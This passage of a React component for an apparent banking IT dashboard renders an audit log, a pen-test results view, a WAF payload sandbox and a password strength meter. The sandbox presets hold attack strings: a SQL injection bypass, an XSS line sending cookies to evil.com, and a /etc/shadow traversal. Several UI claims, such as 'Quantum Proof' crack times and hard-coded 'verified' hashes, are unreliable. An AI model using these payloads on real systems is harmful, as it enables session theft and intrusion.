                  <FileCheck className="w-5 h-5 text-emerald-400" />
                  <span>Immutable Cryptographic Audit Trail (SHA-256 Chained)</span>
                </h3>
                <p className="text-xs text-white/60">
                  Normal users cannot edit or delete audit logs. Every log is cryptographically sealed with the hash of the preceding block.
                </p>
              </div>
              <span className="text-xs font-mono text-emerald-400 bg-emerald-500/10 px-3 py-1 rounded-full border border-emerald-500/30 font-bold">
                ● 100% Chain Integrity Verified
              </span>
            </div>

            <div className="space-y-3">
              {[
                { block: '#1045', action: 'ASSET_MAINTENANCE_LOGGED', user: 'Michael Chang (IT Support)', target: 'Diebold ATM CS-5500', hash: 'd6a1b4c5f7e8d9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4', time: '10:15 AM' },
                { block: '#1044', action: 'SECURITY_INCIDENT_RESOLVED', user: 'Vikram Mehta (Executive)', target: 'Account Lockout Auto-Reset (U-001)', hash: 'c5f0a3b4e6d7c8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3', time: '09:40 AM' },
                { block: '#1043', action: 'FAILED_LOGIN_ATTEMPT', user: 'Raj Sharma (Teller)', target: 'Teller Portal WS-04', hash: 'b4e9f2a3d5c6b7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2', time: '09:35 AM' },
                { block: '#1042', action: 'ACCESS_APPROVAL_GRANTED', user: 'Elena Rostova (IT Manager)', target: 'SWIFT Alliance Gateway', hash: 'a3d8f1e2c4b5a6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1', time: '09:30 AM' }
              ].map((log, idx) => (
                <div key={idx} className="p-4 rounded-2xl bg-white/[0.02] border border-white/10 space-y-2 text-xs">
                  <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-1">
                    <div className="flex items-center gap-2">
                      <span className="font-mono font-bold text-emerald-400 bg-emerald-500/10 px-2 py-0.5 rounded">
                        {log.block}
                      </span>
                      <strong className="text-white">{log.action}</strong>
                    </div>
                    <span className="font-mono text-white/40 text-[11px]">{log.time} Today</span>
                  </div>

                  <div className="flex flex-wrap items-center gap-4 text-[11px] text-white/70">
                    <span>Actor: <strong className="text-white">{log.user}</strong></span>
                    <span>Target: <strong className="text-white">{log.target}</strong></span>
                  </div>

                  <div className="p-2 rounded-xl bg-black/60 border border-white/10 font-mono text-[10px] text-white/50 flex items-center justify-between truncate">
                    <span className="truncate">SHA-256 Digest: {log.hash}</span>
                    <span className="text-emerald-400 font-bold shrink-0 ml-2">✓ Verified</span>
                  </div>
                </div>
              ))}
            </div>

          </div>
        </div>
      )}

      {/* VIEW 6: OWASP PEN-TEST & SECURITY AUDIT SUITE */}
      {activeTab === 'PEN_TEST_SUITE' && (
        <div className="space-y-6 text-left animate-smooth-enter">
          
          {/* Main Pen-Test Scanner Card */}
          <div className="p-6 sm:p-8 rounded-3xl glass-card border border-emerald-500/30 space-y-5 shadow-2xl relative overflow-hidden">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-white/10 pb-4">
              <div>
                <span className="text-[10px] uppercase font-mono font-extrabold px-3 py-1 rounded-full bg-emerald-500/15 border border-emerald-500/30 text-emerald-300">
                  Automated Security Verification
                </span>
                <h3 className="font-display text-xl font-black text-white mt-1 flex items-center gap-2">
                  <ShieldCheck className="w-5 h-5 text-emerald-400" />
                  <span>OWASP Top 10 Penetration &amp; Vulnerability Scanner</span>
                </h3>
                <p className="text-xs text-white/60">
                  Simulate live adversary exploits against BankIT360 endpoints, state filters, and authentication layers.
                </p>
              </div>

              <button
                onClick={handleRunPenetrationSuite}
                disabled={isPenTesting}
                className="px-5 py-2.5 rounded-xl bg-gradient-to-r from-emerald-600 via-teal-600 to-[#00f5ff] hover:opacity-95 disabled:opacity-50 text-white font-extrabold text-xs shadow-glow-cyan flex items-center space-x-2 cursor-pointer transition-all shrink-0"
              >
                <Zap className={`w-4 h-4 ${isPenTesting ? 'animate-spin' : ''}`} />
                <span>{isPenTesting ? `Scanning Vector (${penTestProgress}%)...` : 'Run 1-Click Pen-Test Suite'}</span>
              </button>
            </div>

            {/* Scan Progress Bar */}
            {isPenTesting && (
              <div className="space-y-1.5 animate-pulse">
                <div className="flex justify-between text-[11px] font-mono text-emerald-300">
                  <span>Executing active exploit probes against core banking services...</span>
                  <span>{penTestProgress}% Complete</span>
                </div>
                <div className="w-full h-2 rounded-full bg-black/60 overflow-hidden border border-white/10">
                  <div 
                    className="h-full bg-gradient-to-r from-emerald-500 to-[#00f5ff] transition-all duration-300"
                    style={{ width: `${penTestProgress}%` }}
                  ></div>
                </div>
              </div>
            )}

            {/* Test Results Grid */}
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3.5">
              {penTestResults.map((test) => (
                <div key={test.id} className="p-4 rounded-2xl bg-white/[0.02] border border-white/10 space-y-2 card-fluid">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center space-x-2">
                      <span className="font-mono text-[10px] font-bold px-2 py-0.5 rounded bg-emerald-500/15 text-emerald-400 border border-emerald-500/30">
                        {test.id}
                      </span>
                      <strong className="text-xs text-white">{test.name}</strong>
                    </div>
                    <span className="px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-300 font-mono font-black text-[10px] border border-emerald-500/40 flex items-center space-x-1">
                      <CheckCircle2 className="w-3 h-3" />
                      <span>{test.status} ({test.score})</span>
                    </span>
                  </div>

                  <div className="text-[11px] text-white/60 bg-black/40 p-2 rounded-xl font-mono truncate">
                    <span className="text-white/40">Test Vector: </span>
                    <span className="text-pink-300">{test.vector}</span>
                  </div>

                  <p className="text-[11px] text-white/70 font-medium">
                    {test.detail}
                  </p>
                </div>
              ))}
            </div>
          </div>

          {/* Interactive Live Payload Injection Sandbox */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            
            {/* Box 1: Payload Tester */}
            <div className="p-6 rounded-3xl glass-card border border-white/15 space-y-4 shadow-xl card-fluid">
              <div>
                <span className="text-[10px] uppercase font-mono text-[#ff2d78] font-bold tracking-wider">Live WAF Inspection Sandbox</span>
                <h4 className="text-sm font-black text-white flex items-center space-x-2 mt-0.5">
                  <AlertOctagon className="w-4 h-4 text-[#ff2d78]" />
                  <span>Payload Injection &amp; Sanitizer Test</span>
                </h4>
                <p className="text-[11px] text-white/50">Test raw exploit syntax against active sanitizer rules.</p>
              </div>

              {/* Preset Attack Buttons */}
              <div className="flex flex-wrap gap-1.5 text-[10px]">
                {[
                  { label: 'SQLi Auth Bypass', val: "' OR '1'='1' --" },
                  { label: 'XSS Cookie Grab', val: "<script>fetch('http://evil.com?c='+document.cookie)</script>" },
                  { label: 'Path Traversal', val: "../../../../etc/shadow" },
                  { label: 'Clean Input', val: "Passbook printer jamming at counter 2" }
                ].map(preset => (
                  <button
                    key={preset.label}
                    type="button"
                    onClick={() => {
                      setCustomPenVector(preset.val);
                      handleEvaluateCustomVector(preset.val);
                    }}
                    className="px-2.5 py-1 rounded-lg bg-white/5 hover:bg-white/10 border border-white/10 text-white/80 transition-colors cursor-pointer"
                  >
                    {preset.label}
                  </button>
                ))}
              </div>

              <div className="space-y-2">
                <textarea
                  rows={3}
                  value={customPenVector}
                  onChange={(e) => setCustomPenVector(e.target.value)}
                  className="w-full p-3 rounded-xl bg-black/60 border border-white/15 text-white font-mono text-xs focus:outline-none focus:border-[#ff2d78]"
                  placeholder="Type SQL or XSS vector to test..."
                />

                <button
                  type="button"
                  onClick={() => handleEvaluateCustomVector(customPenVector)}
                  className="w-full py-2.5 rounded-xl bg-[#ff2d78] hover:bg-[#ff2d78]/90 text-white font-black text-xs transition-all shadow-glow flex items-center justify-center space-x-2 cursor-pointer"
                >
                  <Cpu className="w-4 h-4" />
                  <span>Analyze with WAF Engine</span>
                </button>
              </div>

              {customPenResult && (
                <div className="p-3.5 rounded-2xl bg-black/80 border border-white/10 space-y-2 text-xs font-mono">
                  <div className="flex items-center justify-between">
                    <span className="text-white/50">Evaluation:</span>
                    <span className={`px-2 py-0.5 rounded font-black ${customPenResult.status === 'ALLOWED' ? 'bg-emerald-500/20 text-emerald-400' : 'bg-rose-500/20 text-rose-400'}`}>
                      {customPenResult.status}
                    </span>
                  </div>
                  <div className="text-[11px] text-white/70">
                    <div><strong>Rule:</strong> {customPenResult.wafRule}</div>
                    <div><strong>Sanitized:</strong> <span className="text-emerald-300">{customPenResult.sanitized}</span></div>
                  </div>
                </div>
              )}
            </div>

            {/* Box 2: Password Entropy & Brute Force Estimator */}
            <div className="p-6 rounded-3xl glass-card border border-white/15 space-y-4 shadow-xl card-fluid">
              <div>
                <span className="text-[10px] uppercase font-mono text-[#00f5ff] font-bold tracking-wider">Zero-Trust Credential Defense</span>
                <h4 className="text-sm font-black text-white flex items-center space-x-2 mt-0.5">
                  <Lock className="w-4 h-4 text-[#00f5ff]" />
                  <span>Password Entropy &amp; Crack Time Estimator</span>
                </h4>
                <p className="text-[11px] text-white/50">Verify credential complexity against GPU cluster brute-force attacks.</p>
              </div>

              <div className="space-y-3">
                <input
                  type="text"
                  value={testPassword}
                  onChange={(e) => setTestPassword(e.target.value)}
                  className="w-full p-3 rounded-xl bg-black/60 border border-white/15 text-white font-mono text-xs focus:outline-none focus:border-[#00f5ff]"
                  placeholder="Type password to test strength..."
                />

                {/* Live Strength Meter */}
                <div className="p-4 rounded-2xl bg-black/40 border border-white/10 space-y-2 text-xs">
                  <div className="flex items-center justify-between">
                    <span className="text-white/60">Estimated Crack Time:</span>
                    <span className="font-mono font-bold text-emerald-400">
                      {testPassword.length >= 14 ? '340 Trillion Years (Quantum Proof)' : testPassword.length >= 8 ? '4,200 Years' : '1.4 Seconds (CRITICAL)'}
                    </span>
                  </div>

                  <div className="w-full h-1.5 rounded-full bg-white/10 overflow-hidden">
                    <div 
                      className={`h-full transition-all duration-300 ${
                        testPassword.length >= 12 ? 'bg-emerald-400 w-full' : testPassword.length >= 8 ? 'bg-amber-400 w-2/3' : 'bg-rose-500 w-1/4'
                      }`}
                    ></div>
                  </div>

                  <div className="grid grid-cols-2 gap-2 text-[10px] text-white/70 pt-1">
                    <span className={testPassword.length >= 10 ? 'text-emerald-400' : 'text-white/40'}>✓ Min 10 characters</span>
                    <span className={/[A-Z]/.test(testPassword) ? 'text-emerald-400' : 'text-white/40'}>✓ Uppercase letter</span>
                    <span className={/[0-9]/.test(testPassword) ? 'text-emerald-400' : 'text-white/40'}>✓ Number digit</span>
                    <span className={/[^A-Za-z0-9]/.test(testPassword) ? 'text-emerald-400' : 'text-white/40'}>✓ Special symbol</span>
                  </div>
                </div>
              </div>
            </div>

          </div>

        </div>
      )}

    </div>
  );
}
